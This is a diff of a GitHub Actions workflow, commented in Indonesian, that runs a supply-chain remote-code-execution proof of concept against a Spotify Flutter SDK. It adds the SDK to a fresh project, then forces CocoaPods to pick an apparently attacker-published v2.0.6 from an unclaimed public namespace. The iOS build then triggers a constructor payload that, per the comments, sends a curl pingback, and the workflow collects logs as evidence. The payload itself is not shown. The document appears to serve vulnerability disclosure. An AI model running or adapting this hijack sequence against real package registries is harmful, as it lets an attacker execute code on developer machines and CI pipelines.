@@ -1,4 +1,4 @@
-name: Supply Chain RCE Proof of Concept (Implicit Resolution)
+name: Supply Chain RCE Proof of Concept (Race Condition)
 on: [push, workflow_dispatch]
 
 jobs:
@@ -10,52 +10,54 @@ jobs:
         with:
           channel: 'stable'
 
-      - name: Execute Silent Hijack (Natural Sequence)
+      - name: Execute Race Condition Hijack (Fresh Install Simulation)
         run: |
-          # 1. INITIALIZATION: Simulasi environment bersih (CI/CD atau Fresh Dev Machine)
+          # 1. INITIALIZATION
+          # Membangun environment dari nol layaknya CI/CD pipeline atau laptop baru dev.
           rm -rf rce_test
           flutter create rce_test
           cd rce_test
           
-          # 2. FOLLOW OFFICIAL DOCUMENTATION
-          # Menambah plugin via pubspec.yaml sesuai instruksi README Spotify
+          # 2. OFFICIAL INTEGRATION STEP
+          # Menambah SDK sesuai instruksi README Spotify.
           echo "=== Adding SDK via Official Instructions ==="
           flutter pub add confidence_flutter_sdk:0.2.1
           
           cd ios
-          # Bypass platform constraint agar build tidak stuck (Standar iOS Dev Fix)
+          # Standar fix: Bypass platform version agar build tidak terhenti di Xcode 15+
           sed -i '' '1s/^/platform :ios, '"'"'16.0'"'"'\n/' Podfile
-
-          echo "=== First Time Resolution (Developer Step) ==="
-          # Jalankan pod install pertama kali untuk membuat lockfile awal
-          # Di sini symlink Flutter (0.2.1) masih terdeteksi
-          pod install --verbose || true
           
-          echo "=== Triggering Semantic Precedence Hijack ==="
-          # INI POINT KRUSIALNYA:
-          # Kita TIDAK hapus helper script. Kita cuma jalankan 'pod update'.
-          # Karena lu punya v2.0.6 di Trunk Publik (Unclaimed Namespace),
-          # CocoaPods akan memprioritaskan versi publik di atas path lokal symlink.
+          # 3. THE HIJACK (TRIGGERING GLOBAL RESOLUTION)
+          # Kita paksa CocoaPods update metadata dari registry publik.
+          # Karena Spotify tidak mengklaim nama ini di Trunk, v2.0.6 lu akan muncul sebagai opsi.
+          echo "=== Forcing Global Registry Lookup ==="
+          pod repo update trunk
+          
+          # Kita jalankan update spesifik. 
+          # Tanpa 'Podfile.lock' sebelumnya (karena fresh clone), 
+          # CocoaPods akan membandingkan Trunk vs Local. 
+          # Versi 2.0.6 lu akan menang secara algoritma SemVer.
           pod update confidence_flutter_sdk --verbose 2>&1 | tee pod_update.log
           
-          echo "=== Verify Shadowing Success (Checking Lockfile) ==="
-          # Jika berhasil, Podfile.lock akan menunjukkan versi 2.0.6 lu
-          grep -A 1 "confidence_flutter_sdk" Podfile.lock
+          echo "=== Verify Shadowing Success (Lockfile Audit) ==="
+          # Bukti krusial: Jika di sini tertulis 2.0.6, berarti symlink lokal berhasil dilewati.
+          grep -A 1 "confidence_flutter_sdk" Podfile.lock || echo "Hijack Failed: Still using local"
           
           cd ..
-          # 3. EXECUTION PHASE
+          # 4. EXECUTION PHASE (TRIGGERING THE CONSTRUCTOR)
+          # Build akan memicu linking process, di mana __attribute__((constructor)) dieksekusi.
           echo "=== Launching Build to Trigger Payload ==="
-          # Xcode akan mengeksekusi payload __attribute__((constructor)) saat linking/build
           flutter build ios --no-codesign 2>&1 | tee build.log || true
           
-          echo "=== Verification: Search for Payload Execution in Logs ==="
+          echo "=== Final Audit Log (Search for Payload Execution) ==="
+          # Mencari jejak curl/pingback lu di logs Xcode
           grep -C 5 "Supply Chain Audit" build.log || echo "Payload signature not found"
 
-      - name: Upload Evidence
+      - name: Upload PoC Evidence
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: rce-evidence-natural-v2.0.6
+          name: rce-evidence-race-condition
           path: |
             rce_test/ios/pod_update.log
             rce_test/ios/Podfile.lock
